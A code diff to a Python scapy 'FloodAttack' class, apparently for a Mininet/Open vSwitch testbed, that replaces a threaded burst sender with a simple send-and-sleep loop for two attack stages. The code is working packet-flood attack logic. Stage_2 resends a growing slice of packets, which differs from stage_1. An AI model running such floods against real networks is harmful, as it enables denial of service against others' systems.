@@ -1,6 +1,4 @@
 import random
-import queue
-import argparse
 import time
 
 from typing import List
@@ -15,13 +13,12 @@ from scapy.all import (
 
 class FloodAttack:
 
-    def __init__(self, switch: OVSSwitch, iface: Intf, npacket: int, threads: int, bsize: int, bdelay: int):
+    def __init__(self, switch: OVSSwitch, iface: Intf, npacket: int, added_new_packets: int, attack_frequency: int):
         self.switch = switch
         self.iface = iface
-        self.npacket = npacket
-        self.threads = threads
-        self.bsize = bsize
-        self.bdelay = bdelay
+        self.npacket = npacket #RPR
+        self.added_new_packets = added_new_packets
+        self.attack_frequency = attack_frequency
         self.macs: List[str] = []
         self._attack_thread: Thread = None
         self._stop_event: Event = Event()
@@ -83,37 +80,6 @@ class FloodAttack:
 
         return eth / ip / transport
 
-    def send_packets(self, packets: List[Packet]):
-        """Invia i pacchetti in burst tramite worker thread, rispettando _stop_event."""
-        def _worker(q: queue.Queue, delay: int):
-            while not self._stop_event.is_set():
-                try:
-                    chunk = q.get(block=False)
-                except queue.Empty:
-                    return
-                try:
-                    sendp(chunk, iface=self.iface.name, verbose=False)
-                    deadline = time.time() + delay
-                    while time.time() < deadline:
-                        if self._stop_event.is_set():
-                            return
-                        time.sleep(0.1)
-                finally:
-                    q.task_done()
-
-        q: queue.Queue = queue.Queue()
-        for i in range(0, len(packets), self.bsize):
-            q.put(packets[i:i + self.bsize])
-            #print(f"* Burst[{i}]={len(packets[i:i + self.bsize])}")
-
-        n_workers = min(self.threads, q.qsize())
-        workers = []
-        for _ in range(n_workers):
-            t = Thread(target=_worker, args=(q, self.bdelay), daemon=True)
-            t.start()
-            workers.append(t)
-        q.join()
-
     def stage_1(self) -> None:
         if self._stop_event.is_set():
             return
@@ -127,7 +93,9 @@ class FloodAttack:
             packets.append(packet)
         print("[*] Crafted")
         print("[*] Sending")
-        self.send_packets(packets)
+        for i in range(0, len(packets), self.added_new_packets):
+            sendp(packets[i:i + self.added_new_packets], iface=self.iface.name, verbose=False)
+            time.sleep(self.attack_frequency)
         print("[*] Sent")
 
     def stage_2(self) -> None:
@@ -146,7 +114,9 @@ class FloodAttack:
             packets.append(packet)
         print("[*] Crafted")
         print("[*] Sending")
-        self.send_packets(packets)
+        for i in range(0, len(packets), self.added_new_packets):
+            sendp(packets[0:i + self.added_new_packets], iface=self.iface.name, verbose=False)
+            time.sleep(self.attack_frequency)
         print("[*] Sent")
 
     def _run(self):
